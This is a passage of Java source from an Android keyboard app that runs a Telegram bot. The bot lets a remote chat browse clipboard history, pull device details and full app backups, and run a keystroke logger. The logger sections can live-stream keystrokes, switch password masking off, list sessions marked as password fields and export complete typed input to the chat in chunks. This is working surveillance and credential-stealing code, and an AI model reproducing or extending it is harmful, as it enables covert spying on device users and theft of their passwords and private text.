                            backKb("bk_cyy_" + year, "🔙 Back to " + year)); return;
                }

                String[] monthNames = {"","January","February","March","April","May","June","July","August","September","October","November","December"};
                String mName = (month >= 1 && month <= 12) ? monthNames[month] : String.valueOf(month);

                String text = "📅 <b>Calendar — " + mName + " " + year + "</b>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
                        + "<i>Tap a date to view its clips.</i>";

                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
                for (Map.Entry<Integer, Long> en : dayCounts.entrySet()) {
                    int d = en.getKey();
                    kb.append("[{\"text\":\"📆 ").append(mName).append(" ").append(d)
                      .append("  (").append(en.getValue()).append(en.getValue() == 1 ? " clip" : " clips")
                      .append(")\",\"callback_data\":\"cyd_").append(year).append("_").append(month).append("_").append(d).append("\"}],");
                }
                kb.append("[{\"text\":\"🔙 Back to ").append(year).append("\",\"callback_data\":\"bk_cyy_").append(year).append("\"}]]}");
                editOrSend(chatId, msgId, text, kb.toString());
            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
        }, "TG-cal-month").start();
    }

    private void doCalendarDay(long chatId, int msgId, int year, int month, int day) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
                List<ClipboardHistoryService.HistoryEntry> dayClips = getClipsForDay(all, year, month, day);

                if (dayClips.isEmpty()) {
                    editOrSend(chatId, msgId, "📅 <i>No clips on this date.</i>",
                            backKb("bk_cym_" + year + "_" + month, "🔙 Back to Month")); return;
                }

                String[] monthNames = {"","Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};
                String mName = (month >= 1 && month <= 12) ? monthNames[month] : String.valueOf(month);

                String text = "📅 <b>" + mName + " " + day + ", " + year + "</b>  —  "
                        + dayClips.size() + " clip" + (dayClips.size() == 1 ? "" : "s") + "\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
                        + "<i>Tap any clip to view details &amp; options.</i>";

                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
                for (int i = 0; i < dayClips.size(); i++) {
                    ClipboardHistoryService.HistoryEntry e = dayClips.get(i);
                    String label = clipLabel(e.content, e.pinned);
                    String desc = ok(e.description) ? "  📌" : "";
                    kb.append("[{\"text\":").append(jstr(label + desc))
                      .append(",\"callback_data\":\"cc_").append(year).append("_").append(month)
                      .append("_").append(day).append("_").append(i).append("\"}],");
                }
                kb.append("[{\"text\":\"🔙 Back to ").append(mName).append(" ").append(year)
                  .append("\",\"callback_data\":\"bk_cym_").append(year).append("_").append(month).append("\"}]]}");
                editOrSend(chatId, msgId, text, kb.toString());
            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
        }, "TG-cal-day").start();
    }

    private void doCalClipDetail(long chatId, int msgId, int year, int month, int day, int idx) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
                List<ClipboardHistoryService.HistoryEntry> dayClips =
                        getClipsForDay(cb.get_history_entries(), year, month, day);

                if (idx < 0 || idx >= dayClips.size()) {
                    editOrSend(chatId, msgId, "❌ Clip not found.", null); return;
                }
                ClipboardHistoryService.HistoryEntry e = dayClips.get(idx);

                boolean truncated = e.content.length() > 500;
                String preview = truncated ? e.content.substring(0, 500) + "…" : e.content;

                String[] monthNames = {"","Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};
                String mName = (month >= 1 && month <= 12) ? monthNames[month] : String.valueOf(month);

                String text = "📋 <b>Clip Detail</b>  <i>" + mName + " " + day + ", " + year
                        + "  #" + (idx + 1) + "/" + dayClips.size() + "</i>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        + "<code>" + h(preview) + "</code>\n\n"
                        + "🕐 <i>" + h(e.timestamp) + "</i>"
                        + (ok(e.description) ? "\n📌 <i>" + h(e.description) + "</i>" : "")
                        + (e.pinned ? "\n📍 <i>Pinned</i>" : "")
                        + "\n\n<i>Length: " + e.content.length() + " chars</i>"
                        + (truncated ? "  <i>(preview truncated)</i>" : "");

                String calKey = year + "_" + month + "_" + day + "_" + idx;
                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
                // Row 1: Copy Content + Description (each sends a NEW message for easy copying)
                kb.append("[{\"text\":\"📋 Copy Content\",\"callback_data\":\"cpc_").append(calKey).append("\"},")
                  .append("{\"text\":\"📌 Description\",\"callback_data\":\"dec_").append(calKey).append("\"}]");
                // Row 2: Show Full — only when content was truncated in preview
                if (truncated) {
                    kb.append(",[{\"text\":\"🔍 Show Full Content\",\"callback_data\":\"sfc_").append(calKey).append("\"}]");
                }
                // Row 3: Back to date
                kb.append(",[{\"text\":\"🔙 Back to Date\",\"callback_data\":\"bk_cyd_")
                  .append(year).append("_").append(month).append("_").append(day).append("\"}]]}");
                editOrSend(chatId, msgId, text, kb.toString());
            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
        }, "TG-cal-clip").start();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // /appbackup — exact same file as Settings backup (JSON or PDF)
    // ─────────────────────────────────────────────────────────────────────────

    private void doAppBackupFormat(long chatId, int msgId) {
        String text = "💾 <b>App Backup</b>\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                + "Choose the format for your backup file.\n\n"
                + "📋 <b>JSON</b> — Full app backup (settings + all clips + learned words). "
                + "Same file as the backup in ⚙ Settings → Backup.\n\n"
                + "📄 <b>PDF</b> — Readable report (clipboard + smart clips).";
        String kb = "{\"inline_keyboard\":["
                + "[{\"text\":\"📋 JSON (Full Backup)\",\"callback_data\":\"bkj\"}],"
                + "[{\"text\":\"📄 PDF (Readable Report)\",\"callback_data\":\"bkp\"}]]}";
        editOrSend(chatId, msgId, text, kb);
    }

    private void doAppBackupJson(long chatId, int msgId) {
        editOrSend(chatId, msgId, "⏳ <b>Generating full app backup…</b>\n<i>This is the same file as Settings → Backup.</i>", null);
        new Thread(() -> {
            try {
                // Use BackupRestoreSystem — identical to what Settings backup produces
                String json = BackupRestoreSystem.createBackupJson(this);
                if (json == null || json.isEmpty()) {
                    sendTo(chatId, "❌ Nothing to backup."); return;
                }
                String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
                File f = new File(getCacheDir(), "fullkeyboard_backup_" + date + ".json");
                FileOutputStream fos = new FileOutputStream(f);
                fos.write(json.getBytes("UTF-8"));
                fos.close();
                sendDoc(chatId, f, "💾 FullKeyboard Full Backup — " + date
                        + "\n📋 Includes: settings, clipboard, smart clips, learned words");
                f.delete();
            } catch (Exception e) { sendTo(chatId, "❌ Backup error: " + e.getMessage()); }
        }, "TG-backup-json").start();
    }

    private void doAppBackupPdf(long chatId, int msgId) {
        editOrSend(chatId, msgId, "⏳ <b>Generating PDF report…</b>", null);
        new Thread(() -> {
            try {
                File pdf = buildAllPdf();
                if (pdf != null) {
                    String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
                    sendDoc(chatId, pdf, "📄 FullKeyboard PDF Report — " + date);
                    pdf.delete();
                } else sendTo(chatId, "❌ No data found.");
            } catch (Exception e) { sendTo(chatId, "❌ PDF error: " + e.getMessage()); }
        }, "TG-backup-pdf").start();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Other commands
    // ─────────────────────────────────────────────────────────────────────────

    private void cmdStatus(long chatId) {
        ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
        SmartClipsService sc = SmartClipsService.getInstance(this);
        int cbCount = (cb != null) ? cb.get_history_entries().size() : 0;
        int scCount = sc.getClipsForWidget().size();
        boolean locked = sc.isLockEnabled() && !sc.isUnlocked();
        sendTo(chatId, "📊 <b>Status</b>\n\n"
                + "✅ Bot: <b>Online</b>\n"
                + "📋 Clipboard entries: <b>" + cbCount + "</b>\n"
                + "🔐 Smart Clips: <b>" + scCount + "</b>\n"
                + "🔒 Smart Clips lock: <b>" + (locked ? "Locked" : "Unlocked") + "</b>\n"
                + "🗝 Bot PIN session: <b>" + (isPinSessionValid(chatId) ? "Active" : "None") + "</b>\n"
                + "📱 Device: <b>" + h(Build.MANUFACTURER + " " + Build.MODEL) + "</b>\n"
                + "🤖 Android: <b>" + Build.VERSION.RELEASE + "</b>");
    }

    private void cmdClipboard(long chatId) {
        sendTo(chatId, "⏳ Generating clipboard PDF…");
        new Thread(() -> {
            try {
                File pdf = buildClipboardPdf();
                if (pdf != null) { sendDoc(chatId, pdf, "📋 Clipboard History Report"); pdf.delete(); }
                else sendTo(chatId, "❌ No clipboard history found.");
            } catch (Exception e) { sendTo(chatId, "❌ PDF error: " + e.getMessage()); }
        }, "TG-cb-pdf").start();
    }

    private void doSmartClipsPdf(long chatId) {
        sendTo(chatId, "⏳ Generating Smart Clips PDF…");
        new Thread(() -> {
            try {
                File pdf = buildSmartClipsPdf();
                if (pdf != null) { sendDoc(chatId, pdf, "🔐 Smart Clips Report"); pdf.delete(); }
                else sendTo(chatId, "❌ No Smart Clips found.");
            } catch (Exception e) { sendTo(chatId, "❌ PDF error: " + e.getMessage()); }
        }, "TG-sc-pdf").start();
    }

    private void doAllPdf(long chatId) {
        sendTo(chatId, "⏳ Generating full combined report PDF…");
        new Thread(() -> {
            try {
                File pdf = buildAllPdf();
                if (pdf != null) { sendDoc(chatId, pdf, "📦 FullKeyboard Complete Report"); pdf.delete(); }
                else sendTo(chatId, "❌ No data found.");
            } catch (Exception e) { sendTo(chatId, "❌ PDF error: " + e.getMessage()); }
        }, "TG-all-pdf").start();
    }

    private void cmdDevice(long chatId) {
        sendTo(chatId, "📱 <b>Device Information</b>\n\n"
                + "📛 Model: <code>" + h(Build.MODEL) + "</code>\n"
                + "🏭 Manufacturer: <code>" + h(Build.MANUFACTURER) + "</code>\n"
                + "📦 Brand: <code>" + h(Build.BRAND) + "</code>\n"
                + "🔧 Device: <code>" + h(Build.DEVICE) + "</code>\n"
                + "🤖 Android: <code>" + h(Build.VERSION.RELEASE) + " (API " + Build.VERSION.SDK_INT + ")</code>\n"
                + "🏗 Build: <code>" + h(Build.DISPLAY) + "</code>\n"
                + "📦 Package: <code>" + h(getPackageName()) + "</code>\n"
                + "🕐 Time: <code>" + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault()).format(new Date()) + "</code>\n"
                + "🌍 Locale: <code>" + h(Locale.getDefault().toString()) + "</code>\n"
                + "💾 RAM: <code>" + (Runtime.getRuntime().maxMemory() / 1024 / 1024) + " MB max</code>\n"
                + "📊 ABI: <code>" + h(Arrays.toString(Build.SUPPORTED_ABIS)) + "</code>");
    }

    private void promptSearch(long chatId) {
        _awaitSearch.put(chatId, true);
        sendTo(chatId, "🔍 <b>Search Clipboard</b>\n\nType your search query and send it:");
    }

    private void doSearch(long chatId, String query) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                if (cb == null) { sendTo(chatId, "❌ Clipboard not available."); return; }

                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
                all.sort((a, b) -> b.timestamp.compareTo(a.timestamp));

                String lq = query.toLowerCase(Locale.ROOT);
                List<Integer> hitIdxs = new ArrayList<>();
                for (int i = 0; i < all.size(); i++) {
                    ClipboardHistoryService.HistoryEntry e = all.get(i);
                    if (e.content.toLowerCase(Locale.ROOT).contains(lq)
                            || (ok(e.description) && e.description.toLowerCase(Locale.ROOT).contains(lq)))
                        hitIdxs.add(i);
                }

                if (hitIdxs.isEmpty()) {
                    sendTo(chatId, "🔍 No results for <code>" + h(query) + "</code>."); return;
                }

                int shown = Math.min(hitIdxs.size(), 25);
                String header = "🔍 <b>Search: \"" + h(query) + "\"</b>  <i>"
                        + hitIdxs.size() + " found</i>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
                        + "<i>Tap any result to view full details &amp; options.</i>"
                        + (hitIdxs.size() > 25 ? "\n<i>Showing top 25. Refine your query for more.</i>" : "");

                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
                for (int i = 0; i < shown; i++) {
                    int idx = hitIdxs.get(i);
                    ClipboardHistoryService.HistoryEntry e = all.get(idx);
                    String label = clipLabel(e.content, e.pinned);
                    kb.append("[{\"text\":").append(jstr(label))
                      .append(",\"callback_data\":\"rc_").append(idx).append("\"}],");
                }
                if (kb.charAt(kb.length() - 1) == ',') kb.setLength(kb.length() - 1);
                kb.append("]}");

                sendWithMarkup(chatId, header, kb.toString());
            } catch (Exception e) { sendTo(chatId, "❌ Search error: " + e.getMessage()); }
        }, "TG-search").start();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // /keylog — Keystroke Logger
    // ─────────────────────────────────────────────────────────────────────────

    private void cmdKeylog(long chatId) {
        KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
        boolean enabled = KeystrokeLoggerService.isEnabled(this);
        boolean live    = KeystrokeLoggerService.isLive(this);
        boolean maskPw  = KeystrokeLoggerService.isMaskPw(this);
        boolean batch   = KeystrokeLoggerService.isBatch(this);
        int sessions    = kl.getTotalSessions();
        int totalKeys   = kl.getTotalKeys();
        KeystrokeLoggerService.Session cur = kl.getCurrentSession();

        String statusLine = enabled ? "✅ <b>ENABLED</b>" : "🔴 <b>DISABLED</b>";
        String activeInfo = cur != null
                ? "\n🟢 <b>Active:</b> <code>" + KeystrokeLoggerService.kh(cur.appName)
                  + "</code> · " + cur.fieldType + " · " + cur.keyCount + " keys so far"
                : "\n⚫ No active session";

        String text = "⌨️ <b>Keystroke Logger</b>\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n"
                + "Status: " + statusLine + "\n"
                + "📡 Live Stream: " + (live ? "✅ ON" : "❌ OFF") + "\n"
                + "🔒 Mask Passwords: " + (maskPw ? "✅ ON" : "❌ OFF") + "\n"
                + "📦 Batch Send: " + (batch ? "✅ ON" : "❌ OFF") + "\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n"
                + "📊 Sessions: <b>" + sessions + "</b>  ·  Total keys: <b>" + totalKeys + "</b>"
                + activeInfo + "\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n"
                + "<i>Tap a button to configure or browse sessions.</i>";

        String kb = "{\"inline_keyboard\":["
                + "[{\"text\":\"" + (enabled ? "🔴 Disable Logging" : "✅ Enable Logging") + "\","
                +   "\"callback_data\":\"" + (enabled ? "kl_off" : "kl_on") + "\"}],"
                + "[{\"text\":\"📡 Live: " + (live ? "ON ✅" : "OFF ❌") + "\","
                +   "\"callback_data\":\"" + (live ? "kl_lv0" : "kl_lv1") + "\"},"
                +  "{\"text\":\"🔒 Mask PW: " + (maskPw ? "ON ✅" : "OFF ❌") + "\","
                +   "\"callback_data\":\"" + (maskPw ? "kl_mk0" : "kl_mk1") + "\"}],"
                + "[{\"text\":\"📦 Batch: " + (batch ? "ON ✅" : "OFF ❌") + "\","
                +   "\"callback_data\":\"" + (batch ? "kl_bt0" : "kl_bt1") + "\"}],"
                + "[{\"text\":\"📂 View Sessions\",\"callback_data\":\"kl_ss\"},"
                +  "{\"text\":\"🗑 Clear All\",\"callback_data\":\"kl_cl\"}]]}";

        sendWithMarkup(chatId, text, kb);
    }

    private void handleKlCallback(long chatId, int msgId, String data) {
        if (data.equals("kl_m")) {
            cmdKeylog(chatId);
            return;
        }
        // Toggle settings
        if (data.equals("kl_on"))  { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_ENABLED, true).apply();  klRefreshMenu(chatId, msgId); return; }
        if (data.equals("kl_off")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_ENABLED, false).apply(); klRefreshMenu(chatId, msgId); return; }
        if (data.equals("kl_lv1")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_LIVE, true).apply();    klRefreshMenu(chatId, msgId); return; }
        if (data.equals("kl_lv0")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_LIVE, false).apply();   klRefreshMenu(chatId, msgId); return; }
        if (data.equals("kl_mk1")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_MASK_PW, true).apply(); klRefreshMenu(chatId, msgId); return; }
        if (data.equals("kl_mk0")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_MASK_PW, false).apply();klRefreshMenu(chatId, msgId); return; }
        if (data.equals("kl_bt1")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_BATCH, true).apply();   klRefreshMenu(chatId, msgId); return; }
        if (data.equals("kl_bt0")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_BATCH, false).apply();  klRefreshMenu(chatId, msgId); return; }
        // Session list
        if (data.equals("kl_ss"))           { doKlSessions(chatId, msgId, 1); return; }
        if (data.startsWith("kl_sp_"))      { doKlSessions(chatId, msgId, parseInt(data.substring(6), 1)); return; }
        // Session detail / export / delete
        if (data.startsWith("kl_s_"))       { doKlSessionDetail(chatId, msgId, data.substring(5)); return; }
        if (data.startsWith("kl_x_"))       { doKlExport(chatId, data.substring(5)); return; }
        if (data.startsWith("kl_d_"))       { doKlDeleteConfirm(chatId, msgId, data.substring(5)); return; }
        if (data.startsWith("kl_dy_"))      { doKlDeleteDo(chatId, msgId, data.substring(6)); return; }
        // Clear all
        if (data.equals("kl_cl"))           { doKlClearConfirm(chatId, msgId); return; }
        if (data.equals("kl_cy"))           { doKlClearDo(chatId, msgId); return; }
    }

    private void klRefreshMenu(long chatId, int msgId) {
        // Re-build and edit menu in place
        new Thread(() -> cmdKeylogEdit(chatId, msgId), "KL-refresh").start();
    }

    private void cmdKeylogEdit(long chatId, int msgId) {
        KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
        boolean enabled = KeystrokeLoggerService.isEnabled(this);
        boolean live    = KeystrokeLoggerService.isLive(this);
        boolean maskPw  = KeystrokeLoggerService.isMaskPw(this);
        boolean batch   = KeystrokeLoggerService.isBatch(this);
        int sessions = kl.getTotalSessions();
        int totalKeys = kl.getTotalKeys();
        KeystrokeLoggerService.Session cur = kl.getCurrentSession();

        String activeInfo = cur != null
                ? "\n🟢 <b>Active:</b> <code>" + KeystrokeLoggerService.kh(cur.appName) + "</code> · " + cur.keyCount + " keys"
                : "\n⚫ No active session";

        String text = "⌨️ <b>Keystroke Logger</b>\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n"
                + "Status: " + (enabled ? "✅ <b>ENABLED</b>" : "🔴 <b>DISABLED</b>") + "\n"
                + "📡 Live Stream: " + (live ? "✅ ON" : "❌ OFF") + "\n"
                + "🔒 Mask Passwords: " + (maskPw ? "✅ ON" : "❌ OFF") + "\n"
                + "📦 Batch Send: " + (batch ? "✅ ON" : "❌ OFF") + "\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n"
                + "📊 Sessions: <b>" + sessions + "</b>  ·  Keys: <b>" + totalKeys + "</b>"
                + activeInfo;

        String kb = "{\"inline_keyboard\":["
                + "[{\"text\":\"" + (enabled ? "🔴 Disable" : "✅ Enable") + "\","
                +   "\"callback_data\":\"" + (enabled ? "kl_off" : "kl_on") + "\"}],"
                + "[{\"text\":\"📡 Live: " + (live ? "ON ✅" : "OFF ❌") + "\","
                +   "\"callback_data\":\"" + (live ? "kl_lv0" : "kl_lv1") + "\"},"
                +  "{\"text\":\"🔒 Mask PW: " + (maskPw ? "ON ✅" : "OFF ❌") + "\","
                +   "\"callback_data\":\"" + (maskPw ? "kl_mk0" : "kl_mk1") + "\"}],"
                + "[{\"text\":\"📦 Batch: " + (batch ? "ON ✅" : "OFF ❌") + "\","
                +   "\"callback_data\":\"" + (batch ? "kl_bt0" : "kl_bt1") + "\"}],"
                + "[{\"text\":\"📂 Sessions\",\"callback_data\":\"kl_ss\"},"
                +  "{\"text\":\"🗑 Clear All\",\"callback_data\":\"kl_cl\"}]]}";

        editOrSend(chatId, msgId, text, kb);
    }

    private void doKlSessions(long chatId, int msgId, int page) {
        new Thread(() -> {
            try {
                KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
                List<KeystrokeLoggerService.Session> all = kl.getSessions();
                if (all.isEmpty()) {
                    editOrSend(chatId, msgId, "⌨️ <b>Sessions</b>\n\n<i>No sessions recorded yet. Enable logging and start typing.</i>",
                            backKb("kl_m", "◀ Back"));
                    return;
                }
                int pageSize = 8, total = all.size();
                int totalPages = Math.max(1, (total + pageSize - 1) / pageSize);
                int pg = Math.max(1, Math.min(page, totalPages));
                int from = (pg - 1) * pageSize, to = Math.min(from + pageSize, total);

                String header = "📂 <b>Keystroke Sessions</b>  <i>Page " + pg + "/" + totalPages + "</i>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
                        + "<i>Tap a session to see full details.</i>";

                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
                for (int i = from; i < to; i++) {
                    KeystrokeLoggerService.Session s = all.get(i);
                    String label = (s.isPw ? "🔒 " : "📱 ") + truncate(s.appName, 16)
                            + " · " + s.fieldType + " · " + s.keyCount + "k";
                    kb.append("[{\"text\":").append(jstr(label))
                      .append(",\"callback_data\":\"kl_s_").append(s.id).append("\"}],");
                }
                // Nav row
                kb.append("[");
                if (pg > 1) kb.append("{\"text\":\"◀ Prev\",\"callback_data\":\"kl_sp_").append(pg - 1).append("\"},");
                kb.append("{\"text\":\"").append(pg).append("/").append(totalPages).append("\",\"callback_data\":\"kl_ss\"}");
                if (pg < totalPages) kb.append(",{\"text\":\"Next ▶\",\"callback_data\":\"kl_sp_").append(pg + 1).append("\"}");
                kb.append("],[{\"text\":\"◀ Back\",\"callback_data\":\"kl_m\"}]]}");

                editOrSend(chatId, msgId, header, kb.toString());
            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
        }, "KL-sess").start();
    }

    private void doKlSessionDetail(long chatId, int msgId, String sessionId) {
        new Thread(() -> {
            try {
                KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
                List<KeystrokeLoggerService.Session> all = kl.getSessions();
                KeystrokeLoggerService.Session s = null;
                for (KeystrokeLoggerService.Session ss : all) if (ss.id.equals(sessionId)) { s = ss; break; }

                if (s == null) { editOrSend(chatId, msgId, "❌ Session not found.", backKb("kl_ss", "◀ Back")); return; }

                List<KeystrokeLoggerService.Entry> entries = kl.getEntries(sessionId);

                StringBuilder keys = new StringBuilder();
                for (KeystrokeLoggerService.Entry e : entries) {
                    if (!e.modifiers.isEmpty()) keys.append("[").append(e.modifiers).append("+").append(e.keyText).append("]");
                    else keys.append(e.keyText);
                }
                String keyStr = keys.toString();
                boolean truncated = keyStr.length() > 600;
                String preview = truncated ? keyStr.substring(0, 600) + "…" : keyStr;

                String text = "⌨️ <b>Session Detail</b>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
                        + "📱 App: <code>" + KeystrokeLoggerService.kh(s.appName) + "</code>\n"
                        + "📦 Pkg: <code>" + KeystrokeLoggerService.kh(s.appPkg) + "</code>\n"
                        + "🔤 Field: " + KeystrokeLoggerService.kh(s.fieldType) + (s.isPw ? "  🔒 <i>Password</i>" : "") + "\n"
                        + "🕐 Start: <i>" + KeystrokeLoggerService.fmtTime(s.startMs) + "</i>\n"
                        + "⏱ Duration: <i>" + KeystrokeLoggerService.fmtDur(s.endMs - s.startMs) + "</i>\n"
                        + "⌨️ Keys: <b>" + s.keyCount + "</b>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        + "<code>" + KeystrokeLoggerService.kh(preview) + "</code>"
                        + (truncated ? "\n<i>(preview truncated — use Export for full)</i>" : "");

                String kb = "{\"inline_keyboard\":["
                        + "[{\"text\":\"📤 Export Full\",\"callback_data\":\"kl_x_" + s.id + "\"},"
                        +  "{\"text\":\"🗑 Delete\",\"callback_data\":\"kl_d_" + s.id + "\"}],"
                        + "[{\"text\":\"◀ Sessions\",\"callback_data\":\"kl_ss\"},"
                        +  "{\"text\":\"⌨️ Menu\",\"callback_data\":\"kl_m\"}]]}";

                editOrSend(chatId, msgId, text, kb);
            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
        }, "KL-detail").start();
    }

    private void doKlExport(long chatId, String sessionId) {
        new Thread(() -> {
            try {
                KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
                List<KeystrokeLoggerService.Session> all = kl.getSessions();
                KeystrokeLoggerService.Session s = null;
                for (KeystrokeLoggerService.Session ss : all) if (ss.id.equals(sessionId)) { s = ss; break; }
                if (s == null) { sendTo(chatId, "❌ Session not found."); return; }

                List<KeystrokeLoggerService.Entry> entries = kl.getEntries(sessionId);

                StringBuilder sb = new StringBuilder();
                sb.append("📤 <b>Full Export</b>\n")
                  .append("━━━━━━━━━━━━━━━━━━━━━━\n")
                  .append("📱 App: <code>").append(KeystrokeLoggerService.kh(s.appName)).append("</code>\n")
                  .append("📦 Pkg: <code>").append(KeystrokeLoggerService.kh(s.appPkg)).append("</code>\n")
                  .append("🔤 Field: ").append(KeystrokeLoggerService.kh(s.fieldType)).append(s.isPw ? " 🔒" : "").append("\n")
                  .append("🕐 Start: ").append(KeystrokeLoggerService.fmtTime(s.startMs)).append("\n")
                  .append("⏱ Duration: ").append(KeystrokeLoggerService.fmtDur(s.endMs - s.startMs)).append("\n")
                  .append("⌨️ Keys: <b>").append(entries.size()).append("</b>\n")
                  .append("━━━━━━━━━━━━━━━━━━━━━━\n\n");

                StringBuilder keys = new StringBuilder();
                for (KeystrokeLoggerService.Entry e : entries) {
                    if (!e.modifiers.isEmpty()) keys.append("[").append(e.modifiers).append("+").append(e.keyText).append("]");
                    else keys.append(e.keyText);
                }
                String ks = keys.toString();
                // Send in chunks if too long
                int chunkSize = 900;
                if (ks.length() <= chunkSize) {
                    sb.append("<code>").append(KeystrokeLoggerService.kh(ks)).append("</code>");
                    sendTo(chatId, sb.toString());
                } else {
                    sendTo(chatId, sb.toString());
                    for (int i = 0; i < ks.length(); i += chunkSize) {
                        String chunk = ks.substring(i, Math.min(i + chunkSize, ks.length()));
                        int part = (i / chunkSize) + 1;
                        int total = (ks.length() + chunkSize - 1) / chunkSize;
                        sendTo(chatId, "📄 <b>Part " + part + "/" + total + "</b>\n<code>"
                                + KeystrokeLoggerService.kh(chunk) + "</code>");
                    }
                }
            } catch (Exception e) { sendTo(chatId, "❌ Export error: " + e.getMessage()); }
        }, "KL-export").start();
    }

    private void doKlDeleteConfirm(long chatId, int msgId, String sessionId) {
        String text = "🗑 <b>Delete Session?</b>\n\n"
                + "This will permanently delete session <code>" + sessionId + "</code>.\n"
                + "This cannot be undone.";
        String kb = "{\"inline_keyboard\":["
                + "[{\"text\":\"✅ Yes, Delete\",\"callback_data\":\"kl_dy_" + sessionId + "\"},"
                +  "{\"text\":\"❌ Cancel\",\"callback_data\":\"kl_s_" + sessionId + "\"}]]}";
        editOrSend(chatId, msgId, text, kb);
    }

    private void doKlDeleteDo(long chatId, int msgId, String sessionId) {
        new Thread(() -> {
            KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
            boolean ok = kl.deleteSession(sessionId);
            editOrSend(chatId, msgId,
                    ok ? "✅ Session deleted." : "❌ Could not delete session.",
                    backKb("kl_ss", "◀ Sessions"));
        }, "KL-del").start();
    }

    private void doKlClearConfirm(long chatId, int msgId) {
        KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
        int count = kl.getTotalSessions();
        String text = "🗑 <b>Clear All Sessions?</b>\n\n"
                + "This will permanently delete all <b>" + count + "</b> recorded sessions.\n"
                + "This cannot be undone.";
        String kb = "{\"inline_keyboard\":["
                + "[{\"text\":\"✅ Yes, Clear All\",\"callback_data\":\"kl_cy\"},"
                +  "{\"text\":\"❌ Cancel\",\"callback_data\":\"kl_m\"}]]}";
        editOrSend(chatId, msgId, text, kb);
    }

    private void doKlClearDo(long chatId, int msgId) {
        new Thread(() -> {
            KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
            kl.clearAll();
            editOrSend(chatId, msgId, "✅ All keystroke sessions cleared.",
                    backKb("kl_m", "◀ Back to Menu"));
        }, "KL-clear").start();
    }

    private static String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() > max ? s.substring(0, max - 1) + "…" : s;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // /stats
    // ─────────────────────────────────────────────────────────────────────────

    private void cmdStats(long chatId) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                SmartClipsService sc = SmartClipsService.getInstance(this);
                if (cb == null) { sendTo(chatId, "❌ Clipboard not available."); return; }
                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
                long totalChars = 0; int pinned = 0;
                for (ClipboardHistoryService.HistoryEntry e : all) { totalChars += e.content.length(); if (e.pinned) pinned++; }
                double avg = all.isEmpty() ? 0 : (double) totalChars / all.size();
                String oldest = all.isEmpty() ? "—" : all.get(all.size() - 1).timestamp;
                String newest = all.isEmpty() ? "—" : all.get(0).timestamp;
                sendTo(chatId, "📊 <b>Clipboard Statistics</b>\n\n"
                        + "📋 Total entries: <b>" + all.size() + "</b>\n"
                        + "📍 Pinned: <b>" + pinned + "</b>\n"
                        + "🔐 Smart Clips: <b>" + sc.getClipsForWidget().size() + "</b>\n"
